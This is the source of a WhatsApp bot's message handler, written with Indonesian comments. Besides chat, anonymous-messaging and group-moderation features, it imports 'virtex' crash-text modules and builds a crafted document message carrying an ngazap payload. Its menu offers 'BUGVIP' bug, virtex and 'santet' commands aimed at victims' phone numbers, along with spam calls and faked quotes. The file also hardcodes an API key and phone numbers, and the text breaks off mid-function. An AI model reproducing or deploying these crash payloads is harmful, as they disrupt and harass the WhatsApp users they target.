
// DISINI GUA SHARE BASE MD
// KALO ADA ERROR LU FIX SENDIRI
// NAMBAH FITUR LAINNYA YA SILAHKAN
// KEMBANGIN YA KALO BISA

// JANGAN LUPA KASIH TQTQ
// CREDITS : LEXXY OFFICIAL

"use strict";
const { BufferJSON, WA_DEFAULT_EPHEMERAL, proto, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const { downloadContentFromMessage, generateWAMessage, generateWAMessageFromContent, MessageType, buttonsMessage } = require("@adiwajshing/baileys")
const { exec, spawn } = require("child_process");
const { color, bgcolor, pickRandom, randomNomor } = require('./function/console.js')
const { isUrl, getRandom, getGroupAdmins, runtime, sleep, makeid, fetchJson, getBuffer } = require("./function/myfunc");
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./function/addlist');
const { jadibot, listJadibot } = require('./function/jadibot')

// database virtex
const { philips } = require('./function/virtex/philips')
const { virus } = require('./function/virtex/virus')
const { ngazap } = require('./function/virtex/ngazap')

// apinya
const fs = require("fs");
const ms = require("ms");
const chalk = require('chalk');
const axios = require("axios");
const colors = require('colors/safe');
const ffmpeg = require("fluent-ffmpeg");
const moment = require("moment-timezone");

// Response
const msgFilter = require("./function/spam");
const { stalkff } = require("./function/stalker/stalk-ff");
const { stalkml } = require("./function/stalker/stalk-ml");
const { npmstalk } = require("./function/stalker/stalk-npm");
const { githubstalk } = require("./function/stalker/stalk-gh");

let orang_spam = []

// Database
const setting = JSON.parse(fs.readFileSync('./options/config.json'));
const antilink = JSON.parse(fs.readFileSync('./database/antilink.json'));
const mess = JSON.parse(fs.readFileSync('./options/mess.json'));
const db_error = JSON.parse(fs.readFileSync('./database/error.json'));
const db_user = JSON.parse(fs.readFileSync('./database/pengguna.json'));
const db_menfes = JSON.parse(fs.readFileSync('./database/menfess.json'));
const db_respon_list = JSON.parse(fs.readFileSync('./database/list.json'));
const DB_Tiktok = JSON.parse(fs.readFileSync('./database/tiktokAuto.json'));

moment.tz.setDefault("Asia/Jakarta").locale("id");
module.exports = async(conn, msg, m, setting, store) => {
try {
let { ownerNumber, botName } = setting
const { type, quotedMsg, mentioned, now, fromMe, isBaileys } = msg
if (msg.isBaileys) return
const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
const tanggal = moment().tz("Asia/Jakarta").format("ll")
let dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const ucapanWaktu = "Selamat "+dt.charAt(0).toUpperCase() + dt.slice(1)
const content = JSON.stringify(msg.message)
const from = msg.key.remoteJid
const time = moment(new Date()).format("HH:mm");
var chats = (type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (type === 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type === 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type === 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : (type === 'buttonsResponseMessage') && quotedMsg.fromMe && msg.message.buttonsResponseMessage.selectedButtonId ? msg.message.buttonsResponseMessage.selectedButtonId : (type === 'templateButtonReplyMessage') && quotedMsg.fromMe && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : (type === 'messageContextInfo') ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : (type == 'listResponseMessage') && quotedMsg.fromMe && msg.message.listResponseMessage.singleSelectReply.selectedRowId ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : ""
if (chats == undefined) { chats = '' }
const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(chats) ? chats.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '#'
const isGroup = msg.key.remoteJid.endsWith('@g.us')
const sender = isGroup ? (msg.key.participant ? msg.key.participant : msg.participant) : msg.key.remoteJid
const isOwner = [`${setting.ownerNumber}`,"6283834558105@s.whatsapp.net","6282279915237@s.whatsapp.net"].includes(sender) ? true : false
const pushname = msg.pushName
const body = chats.startsWith(prefix) ? chats : ''
const args = body.trim().split(/ +/).slice(1);
const q = args.join(" ");
const isCommand = body.startsWith(prefix);
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
const isCmd = isCommand ? body.slice(1).trim().split(/ +/).shift().toLowerCase() : null;
const botNumber = conn.user.id.split(':')[0] + '@s.whatsapp.net'

// Group
const groupMetadata = isGroup ? await conn.groupMetadata(from) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const groupId = isGroup ? groupMetadata.id : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
const isGroupAdmins = groupAdmins.includes(sender)
const isAntiLink = antilink.includes(from) ? true : false
const isAutoDownloadTT = DB_Tiktok.includes(from) ? true : false

// Quoted
const quoted = msg.quoted ? msg.quoted : msg
const isImage = (type == 'imageMessage')
const isQuotedMsg = (type == 'extendedTextMessage')
const isMedia = (type === 'imageMessage' || type === 'videoMessage');
const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false
const isVideo = (type == 'videoMessage')
const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true : false : false
const isSticker = (type == 'stickerMessage')
const isQuotedSticker = isQuotedMsg ? content.includes('stickerMessage') ? true : false : false 
const isQuotedAudio = isQuotedMsg ? content.includes('audioMessage') ? true : false : false
var dataGroup = (type === 'buttonsResponseMessage') ? msg.message.buttonsResponseMessage.selectedButtonId : ''
var dataPrivate = (type === "messageContextInfo") ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : ''
const isButton = dataGroup.length !== 0 ? dataGroup : dataPrivate
var dataListG = (type === "listResponseMessage") ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : ''
var dataList = (type === 'messageContextInfo') ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : ''
const isListMessage = dataListG.length !== 0 ? dataListG : dataList

function mentions(teks, mems = [], id) {
if (id == null || id == undefined || id == false) {
let res = conn.sendMessage(from, { text: teks, mentions: mems })
return res
} else {
let res = conn.sendMessage(from, { text: teks, mentions: mems }, { quoted: msg })
return res
}
}

const mentionByTag = type == "extendedTextMessage" && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.mentionedJid : []
const mentionByReply = type == "extendedTextMessage" && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.participant || "" : ""
const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
mention != undefined ? mention.push(mentionByReply) : []
const mentionUser = mention != undefined ? mention.filter(n => n) : []

// auto read
conn.readMessages([msg.key])

const reply = (teks) => {conn.sendMessage(from, { text: teks }, { quoted: msg })}

const virusnya = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `GuraBot-MD ${ngazap(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
}}}

// AUTO DOWNLOAD TIKTOK
if (isGroup && isAutoDownloadTT) {
if (chats.match(/(tiktok.com)/gi)){
reply('Url tiktok terdekteksi\nSedang mengecek data url.')
await sleep(3000)
var tt_res = await fetchJson(`https://api.lolhuman.xyz/api/tiktok?apikey=SadTeams&url=${chats}`)
if (tt_res.status == 404) return reply('Gagal url tidak ditemukan')
var lagu_tt = await getBuffer(`https://api.lolhuman.xyz/api/tiktokmusic?apikey=SadTeams&url=${chats}`)
reply(`𝗧𝗜𝗞𝗧𝗢𝗞 𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗

*Author:* Lexxy Official
*Title:* ${tt_res.result.title}
*Durasi:* ${tt_res.result.duration}
*Username:* ${tt_res.result.author.username}
*Nickname:* ${tt_res.result.author.nickname}
*Source:* ${chats}

Video & Audio sedang dikirim...`)
conn.sendMessage(sender,{video:{url:tt_res.result.link}, caption:'No Watermark!'}, {quotes:msg})
conn.sendMessage(sender,{audio:lagu_tt, mimetype:'audio/mpeg', fileName:'tiktokMusic.mp3'}, {quotes:msg})
if (isGroup) return conn.sendMessage(from, {text:'Media sudah dikirim lewat chat pribadi bot.'}, {quoted:msg})
}
}

// Response Addlist
if (!isCmd && isGroup && isAlreadyResponList(from, chats, db_respon_list)) {
var get_data_respon = getDataResponList(from, chats, db_respon_list)
if (get_data_respon.isImage === false) {
conn.sendMessage(from, { text: sendResponList(from, chats, db_respon_list) }, {
quoted: msg
})
} else {
conn.sendMessage(from, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
quoted: msg
})
}
}

// FUNCTION ANTILINK
if (isGroup && isAntiLink) {
if (!isBotGroupAdmins) return reply('Untung Bot Bukan Admin')
var linkgce = await conn.groupInviteCode(from)
if (chats.includes(`https://chat.whatsapp.com/${linkgce}`)) {
reply(`\`\`\`「 Detect Link 」\`\`\`\n\nAnda tidak akan dikick bot karena yang anda kirim adalah link group yg ada di group ini`)
} else if (isUrl(chats)) {
let bvl = `\`\`\`「 Detect Link 」\`\`\`\n\nAdmin telah mengirim link, admin dibebaskan untuk mengirim link apapun`
if (isGroupAdmins) return reply(bvl)
if (fromMe) return reply(bvl)
if (isOwner) return reply(bvl)
await conn.sendMessage(from, { delete: msg.key })
mentions(`「 ANTILINK 」\n\n@${sender.split('@')[0]} Kamu mengirim link group, maaf bot akan kick kamu dari grup`, [sender])
await sleep(3000)
conn.groupParticipantsUpdate(from, [sender], "remove")
} else {
}
}

const sendContact = (jid, numbers, name, quoted, mn) => {
let number = numbers.replace(/[^0-9]/g, '')
const vcard = 'BEGIN:VCARD\n' 
+ 'VERSION:3.0\n' 
+ 'FN:' + name + '\n'
+ 'ORG:;\n'
+ 'TEL;type=CELL;type=VOICE;waid=' + number + ':+' + number + '\n'
+ 'END:VCARD'
return conn.sendMessage(from, { contacts: { displayName: name, contacts: [{ vcard }] }, mentions : mn ? mn : []},{ quoted: quoted })
}

let cekUser = (satu, dua) => { 
let x1 = false
Object.keys(db_user).forEach((i) => {
if (db_user[i].id == dua){x1 = i}})
if (x1 !== false) {
if (satu == "id"){ return db_user[x1].id }
if (satu == "name"){ return db_user[x1].name }
if (satu == "seri"){ return db_user[x1].seri }
if (satu == "premium"){ return db_user[x1].premium }
}
if (x1 == false) { return null } 
}

let setUser = (satu, dua, tiga) => { 
Object.keys(db_user).forEach((i) => {
if (db_user[i].id == dua){
if (satu == "±id"){ db_user[i].id = tiga
fs.writeFileSync('./database/pengguna.json', JSON.stringify(db_user))} 
if (satu == "±name"){ db_user[i].name = tiga 
fs.writeFileSync('./database/pengguna.json', JSON.stringify(db_user))} 
if (satu == "±seri"){ db_user[i].seri = tiga 
fs.writeFileSync('./database/pengguna.json', JSON.stringify(db_user))} 
if (satu == "±premium"){ db_user[i].premium = tiga 
fs.writeFileSync('./database/pengguna.json', JSON.stringify(db_user))} 
}})
}

const cekPesan = (satu, dua) => { 
let x2 = false
Object.keys(db_menfes).forEach((i) => {
if (db_menfes[i].id == dua){x2 = i}})
if (x2 !== false) {
if (satu == "id"){ return db_menfes[x2].id }
if (satu == "teman"){ return db_menfes[x2].teman }
}
if (x2 == false) { return null } 
}

const setRoom = (satu, dua, tiga) => { 
Object.keys(db_menfes).forEach((i) => {
if (db_menfes[i].id == dua){
if (satu == "±id"){ db_menfes[i].id = tiga
fs.writeFileSync('./database/menfess.json', JSON.stringify(db_menfes))} 
if (satu == "±teman"){ db_menfes[i].teman = tiga 
fs.writeFileSync('./database/menfess.json', JSON.stringify(db_menfes))} 
}})
}

// Function for Anti Spam
msgFilter.ResetSpam(orang_spam)

const spampm = () => {
console.log(color('~>[SPAM]', 'red'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname))
msgFilter.addSpam(sender, orang_spam)
reply('Kamu terdeteksi spam bot tanpa jeda, lakukan perintah setelah 5 detik')
}

const spamgr = () => {
console.log(color('~>[SPAM]', 'red'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
msgFilter.addSpam(sender, orang_spam)
reply('Kamu terdeteksi spam bot tanpa jeda, lakukan perintah setelah 5 detik')
}

if (isCmd && msgFilter.isFiltered(sender) && !isGroup) return spampm()
if (isCmd && msgFilter.isFiltered(sender) && isGroup) return spamgr()
if (isCmd && args.length < 1 && !isOwner) msgFilter.addFilter(sender)

//Auto Block Nomor Luar Negeri
if (sender.startsWith('212')) {
return conn.updateBlockStatus(sender, 'block')
}

// Console
if (isGroup && isCmd) {
console.log(colors.green.bold("[Group]") + " " + colors.brightCyan(time,) + " " + colors.black.bgYellow(command) + " " + colors.green("from") + " " + colors.blue(groupName));
}

if (!isGroup && isCmd) {
console.log(colors.green.bold("[Private]") + " " + colors.brightCyan(time,) + " " + colors.black.bgYellow(command) + " " + colors.green("from") + " " + colors.blue(pushname));
}

// Casenya
switch(command) {
case 'menu':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
const mark_slebew = '0@s.whatsapp.net'
const more = String.fromCharCode(8206)
const strip_ny = more.repeat(4001)
var footer_nya =`𝑷𝒐𝒘𝒆𝒓𝒆𝒅 𝑩𝒚 @${setting.ownerNumber.split("@")[0]}`
let menu_nya = `───「 𝗚𝗨𝗥𝗔𝗕𝗢𝗧-𝗠𝗗 」────

 ${ucapanWaktu} ${cekUser("name", sender)} 👋🏻

 𝗨𝗦𝗘𝗥 𝗜𝗡𝗙𝗢
 • ID : @${sender.split('@')[0]}
 • Nama : ${cekUser("name", sender)}
 • Premium : (${cekUser("premium", sender)? '✓':'✘'})

 𝗕𝗢𝗧 𝗜𝗡𝗙𝗢
 • BotName : ${setting.botName}
 • Library : 𝗕𝗮𝗶𝗹𝗲𝘆𝘀-𝗠𝗗
 • Time : ${jam} WIB
 • Date : ${tanggal}
 • Terdaftar : ${("id", db_user).length}
 • Room Chat : ${db_menfes.length}
${strip_ny}
 𝗠𝗔𝗜𝗡 𝗠𝗘𝗡𝗨
 › ${prefix}owner
 › ${prefix}script
 › ${prefix}toimg
 › ${prefix}sticker
 › ${prefix}spamcall
 › ${prefix}jadibot
 › ${prefix}listjadibot
 › ${prefix}infoupdate
 › ${prefix}groupbot
 
 𝗔𝗡𝗢𝗡𝗬𝗠𝗢𝗨𝗦 𝗖𝗛𝗔𝗧
 › ${prefix}chat
 › ${prefix}skip
 › ${prefix}start
 › ${prefix}secret
 › ${prefix}confess
 › ${prefix}menfess
 › ${prefix}secretchat
 › ${prefix}stopchat

 𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨
 › ${prefix}error
 › ${prefix}server
 › ${prefix}infouser
 › ${prefix}runtime
 › ${prefix}session
 › ${prefix}resetdb
 › ${prefix}addprem
 › ${prefix}delprem
 › ${prefix}broadcast
 › ${prefix}dashboard

 𝗚𝗥𝗢𝗨𝗣 𝗠𝗘𝗡𝗨
 › ${prefix}hidetag
 › ${prefix}tagall
 › ${prefix}fitnah
 › ${prefix}delete
 › ${prefix}revoke
 › ${prefix}linkgrup
 › ${prefix}setdesc
 › ${prefix}demote
 › ${prefix}antilink
 › ${prefix}promote
 › ${prefix}setppgrup
 › ${prefix}kick @tag
 › ${prefix}setnamegc
 › ${prefix}group open
 › ${prefix}group close

 𝗦𝗧𝗔𝗟𝗞𝗘𝗥 𝗠𝗘𝗡𝗨
 › ${prefix}ffstalk *id*
 › ${prefix}mlstalk *id|zone*
 › ${prefix}npmstalk *packname*
 › ${prefix}githubstalk *username*

 𝗞𝗔𝗟𝗞𝗨𝗟𝗔𝗧𝗢𝗥
 › ${prefix}kali *angka angka*
 › ${prefix}bagi *angka angka*
 › ${prefix}kurang *angka angka*
 › ${prefix}tambah *angka angka*

 𝗦𝗧𝗢𝗥𝗘 𝗠𝗘𝗡𝗨
 › ${prefix}list *<only grup>*
 › ${prefix}addlist *key@pesan*
 › ${prefix}dellist *<options>*
 › ${prefix}update *key@pesan*
 › ${prefix}proses *<reply orderan>*
 › ${prefix}done *<reply orderan>*
 
 𝗕𝗨𝗚𝗩𝗜𝗣 𝗠𝗘𝗡𝗨
 › ${prefix}philips *628xxx*
 › ${prefix}philips2 *628xxx*
 › ${prefix}philips3 *628xxx*
 › ${prefix}santet *@tag*
 › ${prefix}santet2 *@tag*
 › ${prefix}santet3 *@tag*
 › ${prefix}virtex *628xxx*
 › ${prefix}virtex2 *628xxx*
 › ${prefix}virtex3 *628xxx*
 › ${prefix}bug1 *628xxx*
 › ${prefix}bug2 *628xxx*
 › ${prefix}bug3 *628xxx*
 › ${prefix}bug4 *628xxx*
 › ${prefix}bug5 *628xxx*
`
let buttonmenu = [
{buttonId: '#iklan', buttonText: {displayText: '️⋮☰ 𝙄𝙆𝙇𝘼𝙉'}, type: 1},
{buttonId: '#owner', buttonText: {displayText: '️⋮☰ 𝙊𝙒𝙉𝙀𝙍'}, type: 1},
{buttonId: '#groupbot', buttonText: {displayText: '️⋮☰ 𝙂𝙍𝙊𝙐𝙋'}, type: 1}
]
conn.sendMessage(from, 
{text: menu_nya, 
buttons: buttonmenu,
footer: footer_nya,
mentions:[setting.ownerNumber, sender]},
{quoted:msg})
}
break
case 'verify':{
if (cekUser("id", sender) !== null) return reply('Kamu sudah terdaftar !!')
var res_us = `${makeid(10)}`
var diacuk = `${db_user.length+1}`
var user_name = `#GRXY${diacuk}`
let object_user = {"id": sender, "name": user_name, "seri": res_us, "premium": false}
db_user.push(object_user)
fs.writeFileSync('./database/pengguna.json', JSON.stringify(db_user))
mentions(`𝖬𝖾𝗆𝗎𝖺𝗍 𝖴𝗌𝖾𝗋 @${sender.split("@")[0]}`, [sender])
await sleep(1500)
var verify_teks =`───「 𝗧𝗘𝗥𝗩𝗘𝗥𝗜𝗙𝗜𝗞𝗔𝗦𝗜 」────

 ○ ID : @${sender.split('@')[0]}
 ○ Name : ${user_name}
 ○ Seri : ${res_us}
 ○ Premium : (${cekUser("premium", sender)? '✓':'✘'})
`
var buttonMessage = {
text: verify_teks,
footer: 'Klik button untuk melihat menu',
mentions: [sender],
buttons: [
{ buttonId: '#menu', buttonText: {displayText: '️⋮☰ 𝗠𝗘𝗡𝗨'}, type: 1}
],
headerType: 1
}
conn.sendMessage(from, buttonMessage, {quoted:msg})
await sleep(1000)
var teksss_verify =`𝙍𝙀𝙂𝙄𝙎𝙏𝙀𝙍 𝙐𝙎𝙀𝙍
○ ID : @${sender.split('@')[0]}
○ Seri : ${res_us}
○ Name : ${user_name}
○ Terdaftar : ${db_user.length}`
conn.sendMessage(`${setting.ownerNumber}`, {text:teksss_verify, mentions: [sender]})
}
break
case 'grupbot':
case 'groupbot':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
reply(`*Forum Bot Whatsapp*
https://chat.whatsapp.com/E3zewfxrc5pKE6Rzb3BuqG`)
break
case 'infoupdate':
reply('-')
break
case 'script': case 'sc':
reply(`_SCRIPT BOT INI DIJUAL_
_HARGA 80K JIKA MINAT?_

*Whatsapp Admin*
Wa.me/6283834558105`)
break
case 'owner':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
var owner_Nya = setting.ownerNumber
sendContact(from, owner_Nya, setting.ownerName, msg)
}
break
case 'auto_room':{
var id_satu = q.split('|')[0]
var id_dua = q.split('|')[1]
var id_rom = q.split('|')[2]
db_menfes.push({"id": id_satu, "teman": id_dua})
fs.writeFileSync('./database/menfess.json', JSON.stringify(db_menfes))
db_menfes.push({"id": id_dua, "teman": id_satu})
fs.writeFileSync('./database/menfess.json', JSON.stringify(db_menfes))
var tulis_pesan = `𝗖𝗵𝗮𝘁 𝗔𝗻𝗼𝗻𝘆𝗺𝗼𝘂𝘀 𝗧𝗲𝗿𝗵𝘂𝗯𝘂𝗻𝗴✓
𝗦𝗶𝗹𝗮𝗵𝗸𝗮𝗻 𝗞𝗶𝗿𝗶𝗺 𝗣𝗲𝘀𝗮𝗻✍

𝗸𝗲𝘁𝗶𝗸 #𝘀𝘁𝗼𝗽𝗰𝗵𝗮𝘁
𝘂𝗻𝘁𝘂𝗸 𝗺𝗲𝗻𝗴𝗵𝗮𝗽𝘂𝘀 𝘀𝗲𝘀𝗶 𝗰𝗵𝗮𝘁

𝗡𝗼𝘁𝗲:
𝙧𝙤𝙤𝙢 𝙘𝙝𝙖𝙩 𝙞𝙣𝙞 𝙗𝙚𝙧𝙨𝙞𝙛𝙖𝙩 𝙖𝙣𝙤𝙣𝙞𝙢
𝙟𝙖𝙙𝙞 𝙠𝙖𝙢𝙪 𝙩𝙞𝙙𝙖𝙠 𝙩𝙖𝙪 𝙥𝙖𝙩𝙣𝙚𝙧𝙢𝙪
𝙠𝙚𝙘𝙪𝙖𝙡𝙞 𝙙𝙞𝙖 𝙢𝙚𝙣𝙜𝙜𝙪𝙣𝙖𝙠𝙖𝙣 𝙣𝙖𝙢𝙖 𝙖𝙨𝙡𝙞
𝙖𝙩𝙖𝙪 𝙢𝙚𝙢𝙗𝙚𝙧𝙞𝙩𝙖𝙝𝙪𝙠𝙖𝙣 𝙞𝙣𝙛𝙤𝙧𝙢𝙖𝙨𝙞 𝙙𝙖𝙧𝙞𝙣𝙮𝙖.

𝘿𝙞𝙡𝙖𝙧𝙖𝙣𝙜 𝙨𝙥𝙖𝙢/𝙩𝙚𝙡𝙥𝙤𝙣 𝙗𝙤𝙩
𝙎𝙖𝙣𝙠𝙨𝙞 : 𝘽𝙡𝙤𝙠𝙞𝙧 𝙋𝙚𝙧𝙢𝙖𝙣𝙚𝙣

𝗥𝗼𝗼𝗺 𝗜𝗗 : ${id_rom}`
var buttonMessage = {
text: tulis_pesan,
footer: 'klik button untuk menghapus sesi chat',
buttons: [
{ buttonId: '#stopchat', buttonText: {displayText: '️⋮☰ 𝗦𝗧𝗢𝗣'}, type: 1}
],
headerType: 1
}
conn.sendMessage(id_satu, buttonMessage)
conn.sendMessage(id_dua, buttonMessage)
}
break
case 'skip':
case 'stopchat':
if (cekPesan("id", sender) == null) return reply(`Kamu sedang tidak didalam roomchat, Silahkan buat room dengan contoh dibawah ini.\n\n*Example:*\n#menfess num|nama|pes\n\n*Contoh:*\n#menfess 628xxx|bot|hai\n\n*Note:*\n6285789004732 - benar (✅)\n+62 857 8900 4732 - salah (❌)`)
if (isGroup) return reply(mess.OnlyPM)
var aku = sender
var dia = cekPesan("teman", aku)
var teks_aku = `[✓] *Berhasil memberhentikan chat*`
setRoom("±teman", dia, null)
setRoom("±teman", aku, null)
await sleep(2000)
conn.sendMessage(aku,{text:teks_aku})
setRoom("±id", aku, null)
setRoom("±id", dia, null)
var teks_dia = `[✓] *Room chat telah dihentikan*\n*oleh patner chat kamu.*`
conn.sendMessage(dia,{text:teks_dia})
break
case 'confes':
case 'confess':
case 'secretchat':{
if (cekPesan("id", sender) !== null) return reply("Kamu Sedang Didalam roomchat ketik *#stopchat* untuk menghapus sesi chat.")
if (!q) return reply(`Format invalid!!\n\n*Example:*\n${prefix+command} number|nama\n\n*Contoh:*\n${prefix+command} 628xxx|bot\n\n_isi number yg sesuai perintah bot_\n\n*Contoh*\n628xxx > benar\n+628xxx > salah\n\ntanpa spasi dan tanda +`)
let num = q.split('|')[0]
if (!num) return reply('Number tujuan wajib di isi')
let nama_pengirim = q.split('|')[1]
if (num == sender.split('@')[0]) return reply('Ngirim ke nomor sendiri:v\ncapek ya? semangat🗿')
if (!nama_pengirim) return reply('Nama kamu wajib di isi')
var cekap = await conn.onWhatsApp(num+"@s.whatsapp.net")
if (cekap.length == 0) return reply(`Nomor +${num}\ntidak terdaftar di WhatsApp`)
var penerimanyo = num+'@s.whatsapp.net'
mentions(`Berhasil mengirimkan undangan chat ke @${penerimanyo.split('@')[0]} tunggu dia menyetujui undangan tersebut untuk chatan secara anonim jadi dia tidak tau siapa anda`, [penerimanyo])
let roomC = `#${makeid(10)}`
var text_tersambung =`*Seseorang Mengajak Chating*\n\n*Dari:* ${nama_pengirim}\n\nSilahkan klik button ya kak jika ingin menghubungkan chat *ANONYMOUS*`
let btn_room = [{ buttonId: `${prefix}auto_room ${sender}|${penerimanyo}|${roomC}`, buttonText: { displayText: '⋮☰ 𝗧𝗘𝗥𝗜𝗠𝗔' }, type: 1 }]
var but_room = {
text: text_tersambung,
footer: 'Klik button untuk menerima chat.',
buttons: btn_room,
mentions: [penerimanyo],
headerType: 1
}
conn.sendMessage(penerimanyo, but_room)
}
break
case 'menfes': case 'menfess':{
if (cekPesan("id", sender) !== null) return reply("Kamu Sedang Didalam roomchat ketik *#stopchat* untuk menghapus sesi chat.")
if (!q) return reply(`Format Fitur Menfess / Kirim pesan rahasia ke seseorang Lewat bot\n\n_*Example*_\n${prefix+command} wa|pengirim|pesan\n\n_*Contoh*_\n${prefix+command} 6285789004732|bot|hai\n\n*Note :*\nBerawal dari 628xxx tanpa spasi`)
let num = q.split('|')[0]
let nama_pengirim = q.split('|')[1]
let pesan_teman = q.split('|')[2]
var cekap = await conn.onWhatsApp(num+"@s.whatsapp.net")
if (cekap.length == 0) return reply(`Nomor +${num}\ntidak terdaftar di WhatsApp`)
let roomC = `#${makeid(10)}`
if (num == botNumber.split('@')[0]) return reply('Itu kan nomor bot')
if (num == sender.split('@')[0]) return reply('Menfes ke nomor sendiri:v\ncapek ya? semangat🗿')
if (!num) return reply(`Harus di isi semua !!\nex : ${prefix+command} 62857xxx|nama|hallo\n\nnomor hp tanpa +/spasi`)
if (!nama_pengirim) return reply(`Harus di isi semua !!\nex : ${prefix+command} 62857xxx|nama|hallo\n\nnomor hp tanpa spasi`)
if (!pesan_teman) return reply(`Harus di isi semua !!\nex : ${prefix+command} 62857xxx|nama|hallo\n\nnomor hp tanpa spasi`)
var penerimanyo = num+'@s.whatsapp.net'
mentions(`Berhasil mengirimkan undangan chat ke @${penerimanyo.split('@')[0]} tunggu dia menyetujui undangan tersebut untuk chatan secara anonim jadi dia tidak tau siapa anda`, [penerimanyo])
let text_menfess = `*ANONYMOUS CHAT*\n_Hallo Kak ${ucapanWaktu}_\n_Ada pesan *Menfess/Rahasia*_\n\n*• Dari :* ${nama_pengirim}\n*• Pesan :* ${pesan_teman}\n\n_Pesan ini ditulis oleh seseorang_\n_Bot hanya menyampaikan saja._`
let btn_menfes = [{ buttonId: `${prefix}auto_room ${sender}|${num}@s.whatsapp.net|${roomC}`, buttonText: { displayText: '⋮☰ 𝗧𝗘𝗥𝗜𝗠𝗔' }, type: 1 }]
var button_menfess = {
text: text_menfess,
footer: 'Klik button untuk membalas chat.',
buttons: btn_menfes,
headerType: 1
}
conn.sendMessage(`${num}@s.whatsapp.net`, button_menfess)
}
break
case 'secret':{
if (cekPesan("id", sender) !== null) return reply("Kamu Sedang Didalam roomchat ketik *#stopchat* untuk menghapus sesi chat.")
if (!q) return reply(`Format Fitur Secrett / Kirim pesan rahasia ke seseorang Lewat bot\n\n_*Example*_\n${prefix+command} wa|pengirim\n\n_*Contoh*_\n${prefix+command} 628xxxx|bot\n\n*Note :*\nBerawal dari 628xxx tanpa spasi`)
let num = q.split('|')[0]
let nama_pengirim = q.split('|')[1]
var cekap = await conn.onWhatsApp(num+"@s.whatsapp.net")
if (cekap.length == 0) return reply(`Nomor +${num}\ntidak terdaftar di WhatsApp`)
let roomC = `#${makeid(10)}`
if (num == botNumber.split('@')[0]) return reply('Itu kan nomor bot')
if (num == sender.split('@')[0]) return reply('Menfes ke nomor sendiri:v\ncapek ya? semangat🗿')
if (!num) return reply(`Harus di isi semua !!\nex : ${prefix+command} 62857xxx|nama|hallo\n\nnomor hp tanpa spasi`)
if (!nama_pengirim) return reply(`Harus di isi semua !!\nex : ${prefix+command} 62857xxx|nama|hallo\n\nnomor hp tanpa spasi`)
var penerimanyo = num+'@s.whatsapp.net'
mentions(`Berhasil mengirimkan undangan chat ke @${penerimanyo.split('@')[0]} tunggu dia menyetujui undangan tersebut untuk chatan secara anonim jadi dia tidak tau siapa anda`, [penerimanyo])
setRoom("±id", sender, penerimanyo)
setRoom("±id", penerimanyo, sender)
setRoom("±teman", sender, penerimanyo)
setRoom("±teman", penerimanyo, sender)
let text_menfess = `*ANONYMOUS CHAT*\n_Hallo Kak ${ucapanWaktu}_\n_Ada pesan *Secret/Rahasia*_\n\n*• Dari :* ${nama_pengirim}\n\n_Pesan ini ditulis oleh seseorang_\n_Bot hanya menyampaikan saja._`
let btn_menfes = [
{ buttonId: `${prefix}auto_room ${sender}|${num}@s.whatsapp.net|${roomC}`, buttonText: { displayText: '⋮☰ 𝗧𝗘𝗥𝗜𝗠𝗔' }, type: 1 },
{ buttonId: `${prefix}tolak_secret ${sender}`, buttonText: { displayText: '⋮☰ 𝗧𝗢𝗟𝗔𝗞' }, type: 1 }
]
var button_menfess = {
text: text_menfess,
footer: 'Klik button untuk membalas chat.',
buttons: btn_menfes,
headerType: 1
}
